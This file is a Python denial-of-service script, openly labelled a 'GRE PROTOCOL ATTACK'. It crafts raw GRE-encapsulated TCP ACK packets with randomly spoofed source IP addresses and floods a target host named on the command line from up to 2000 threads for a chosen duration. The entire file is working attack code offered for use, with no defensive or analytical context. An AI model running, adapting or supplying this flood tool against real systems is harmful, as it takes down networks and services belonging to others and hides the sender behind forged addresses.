#!/usr/bin/env python3
"""
🔥 GRE PROTOCOL ATTACK - 10+ Gbps 🔥
Generic Routing Encapsulation flood
"""

import socket
import random
import sys
import time
import threading
import os
import struct

target = sys.argv[1]
duration = int(sys.argv[2])
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 2000
port = int(sys.argv[4]) if len(sys.argv) > 4 else 0

# ============================================================
# OPTIMIZED SETTINGS
# ============================================================

MAX_PACKET = 65534
GRE_PROTOCOL = 47  # GRE protocol number

# ============================================================
# GRE PACKET BUILDER
# ============================================================

def create_gre_packet(src_ip, dst_ip, src_port, dst_port, seq, ack):
    """Create GRE encapsulated TCP packet"""
    
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20 + 8  # IP + TCP + GRE
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = GRE_PROTOCOL
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr
    )
    
    # GRE Header
    gre_flags = 0x0000  # No checksum, no routing, no key, no sequence
    gre_proto = 0x0800  # IPv4 payload
    
    gre_header = struct.pack('!HH',
        gre_flags,
        gre_proto
    )
    
    # TCP Header (encapsulated)
    tcp_sport = src_port
    tcp_dport = dst_port if dst_port > 0 else random.randint(1, 65535)
    tcp_seq = seq
    tcp_ack = ack
    tcp_offset = 5
    tcp_flags = 0x10  # ACK flag
    tcp_window = 65535
    tcp_check = 0
    tcp_urg = 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_sport,
        tcp_dport,
        tcp_seq,
        tcp_ack,
        (tcp_offset << 4) + 0,
        tcp_flags,
        tcp_window,
        tcp_check,
        tcp_urg
    )
    
    return ip_header + gre_header + tcp_header

# ============================================================
# GRE FLOOD WORKER
# ============================================================

def gre_worker(thread_id):
    try:
        # Create raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        
        end_time = time.time() + duration
        count = 0
        src_ports = [53, 80, 443, 8080, 8443, 123, 161, 389, 3306, 21, 22, 25, 110, 143, 993, 995]
        
        while time.time() < end_time:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.choice(src_ports)
                dst_port = port if port > 0 else random.randint(1, 65535)
                seq = random.randint(1, 4294967295)
                ack = random.randint(1, 4294967295)
                
                packet = create_gre_packet(src_ip, target, src_port, dst_port, seq, ack)
                s.sendto(packet, (target, 0))  # GRE doesn't use port
                count += 1
                
                if count % 10000 == 0:
                    sys.stderr.write(f"GRE #{thread_id}: {count} packets\n")
            except:
                pass
        s.close()
        sys.stderr.write(f"GRE #{thread_id} completed\n")
    except:
        pass

print(f"""
╔═══════════════════════════════════════════════════════════════╗
║  🔥 GRE PROTOCOL ATTACK - 10+ GBPS 🔥                       ║
╠═══════════════════════════════════════════════════════════════╣
║  Target: {target}                                            ║
║  Duration: {duration}s                                       ║
║  Threads: {threads}                                          ║
║  Protocol: GRE (47)                                         ║
║  Method: GRE encapsulated TCP flood                         ║
╚═══════════════════════════════════════════════════════════════╝
""")

for i in range(threads):
    threading.Thread(target=gre_worker, args=(i,), daemon=True).start()

time.sleep(duration + 2)
